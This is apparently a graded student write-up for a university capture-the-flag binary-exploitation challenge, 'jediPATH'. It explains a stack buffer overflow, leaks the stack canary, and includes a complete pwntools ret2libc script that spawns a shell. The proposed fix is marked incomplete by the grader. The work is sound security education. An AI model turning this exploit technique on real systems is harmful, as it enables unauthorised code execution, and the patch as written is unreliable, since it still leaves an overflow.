**Name:** flofriday

**Points:** 0.9 of 1.0 Points

**Feedback:** The solution is incomplete, with the patch an attacker can still write up to 64 bytes into guess, such that `guess` no longer contains a null terminator (note the <= comparison and that c-strings are 0-indexed). Thus, the `printf` can still print past the end of `guess`.

**Notes:** Baby yoda ☺️

<hr>

# jediPATH

## Overview

The program `jedipath` asks a padawan to guess a secret number, this happens three times (with three different numbers). If the user guesses correctly it will print the SHA256 hash of the file `/challenges/jedipath/flag`.

## Vulnerability

The vulnerability is a bufferoverflow in the lines `17` to `22` (linenumbers from `jedipath_partial.c`):

```c
 17         while (guess_len <= MAX_P_LEN) {
 18             guess[guess_len] = getchar();
 19             if (guess[guess_len] == '\n')
 20                 break;
 21             guess_len++;
 22         }
```

Here, the code copies up to`MAX_P_LEN` many bytes, which I figured out to be `96`, into the buffer `guess` which is only `64` bytes large, and thereby allowing an attacker to overwrite memory on the stack.

## Exploitation

During the development of this exploit I was on a call with █████ and later on another call with █████. On those calls we discussed the problems, possible strategies but never shared code or flags.

The first step is to copy all relevant files into our own home folder so that we can modify them and attach debugers to binaries.

```bash
mkdir $HOME/jedipath
cd jedipath
cp /challenges/jedipath/* .
```

Since this is a binaryexploitation challenge, I asumed the vulnerbility can be triggered with a buffer overflow, so my first attempt was to write an unlikly amount of data to the program:

```bash
$ (python3 -c "print('A' * 1024)" ; cat) | ./jedipath
[1] Read my mind... *** stack smashing detected ***: <unknown> terminated
```

"stack smashing detected" so we definitly did *something* unexpected. After some searching and reading this [amazing article]([Stack Canaries - CTF 101](https://ctf101.org/binary-exploitation/stack-canaries/)) about canary on Linux, I knew that I triggered a buffer overflow, overwrote the canary/stack-cookie and when the function was about to return it compared the cookie, detected the changes and exited with an error.

Before jumping in and trying to write an exploit, I wanted to test the binary further with the tools `checksec` and `ldd`:

```bash
$ checksec jedipath
[*] '/home/stud51/jedipath/jedipath'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$ ldd jedipath
    linux-gate.so.1 (0xf7fd4000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7de9000)
    /lib/ld-linux.so.2 (0xf7fd6000)
```

With that I knew that jumping to shell-code is impossible because of the NX protection, and that indeed the stack smashing warning was from the canary. However, there is no ASLR and `libc` is dynamically linked.

After reading the source code in `jedipath_partial.c` I started to build an abstract mental model of how the exploit might work:

1) In the first iteration of the Loop starting at line `8` I can overwrite the first byte of the stack cookie so that the `printf` in line `27` leaks the three random bytes of it.

2) In the second iteration it is now possible to overwrite the canary with the original value so that no stacksmashing will be detected when the function returns. Moreover, we can now overwrite the return address and jump to the `system` function of `libc` and drop a shell with elevated privileges and print the flag.

To jump to `system` we need to know the address of the function and also find a string containing `/bin/sh`, both can be found in `gdb` with the following commands:

```gdb
(gdb) print system
$1 = {<text variable, no debug info>} 0x8048600 <system@plt>
(gdb) info proc map
...
 0xf7de9000 0xf7fbe000   0x1d5000        0x0 /lib/i386-linux-gnu/libc-2.27.so
...
(gdb) find 0xf7de9000, 0xf7fbe000, "/bin/sh"
0xf7f670af
1 pattern found.
```

Next, by inspecting the stack with `gdb` we can figure out the padding between canary and the saved eip, so that we can create the following criteria for the three payloads:

- **First Payload**: any 64 bytes followed by a newline (`\n`).

- **Second Payload**: just a newline(`\n`).

- **Third Payload**: 
  
  - bytes 01-64: Padding (any byte)
  
  - bytes 65-68: a zero byte followed by the three canary bytes leaked from the first payload.
  
  - bytes 69-80: Padding (any byte)
  
  - bytes 81-84: the address of system function.
  
  - bytes 85-88: Padding (any byte). (Reason for this padding is explained on Tuwel  in this [Forum post](https://tuwel.tuwien.ac.at/mod/forum/discuss.php?d=245140))
  
  - bytes 89-92: the address of the `/bin/bash` string.
  
  - byte 93: a newline(`\n`).

- **Note:** Since the program stops reading an answer after an newline, the payloads can only contain a newline at the end. This means that if the canary has a newline, we cannot exploit the program and we need to start over.

I automated the exploit with a python script, saved in `expl.py`:

```python
import sys
import re
from pwn import * 

system_addr = p32(0xf7e262e0)
shell_addr = p32(0xf7f670af)

def main():
    print('''
 ________________________________
< The path to a shell you are on >
 --------------------------------
     \      
      \        .
       __.-._ //
       '-._.7//
        /'.-K/
        |  /T
       _)_/LI
 --------------------------------
''')

    # Leak the canray
    p = process(sys.argv[1])
    payload1 = b'A' * 64 + b'\n\n'
    p.send(payload1)
    data = p.recvuntil(b'[2]')
    match = re.search(b'AAA\n(.*)[2]',  data)
    canary = b'\0' + match.groups()[0]
    canary = canary[:4] # The canary is only 32 bits

    if b'\n' in canary:
        print('ERROR: canaray contains newline, just try again.')
        sys.exit(1)

    # Return to libc
    padding1 = b'A'*(64)
    padding2 = b'A' * 12
    padding3 = b'A' * 4
    payload2 = padding1 +  canary + padding2 + system_addr + padding3 + shell_addr + b'\n'
    p.send(payload2)
    print('-' * 14 + ' SHELL ' + '-' * 14)

    # Drop to interactiv so we can interact with the spawned shell
    p.recvline()
    p.interactive()

if __name__ == '__main__':
    main()
```

Finally, we can run the exploit with `python3 expl.py /challenges/jedipath/jedipath` and then read the flag with `cat /challenges/jedipath/flag`.

## Solution

Since I don't have access to the original source code `jedipath.c` (even with the exploit), I cannot provide any line numbers. 

The macro `MAX_P_LEN` (asuming it is a macro, it might also be just a global variable) should be changed to `63` which will fix the bufferoverflow and thereby fixes all vulnerabilities that arise from it.

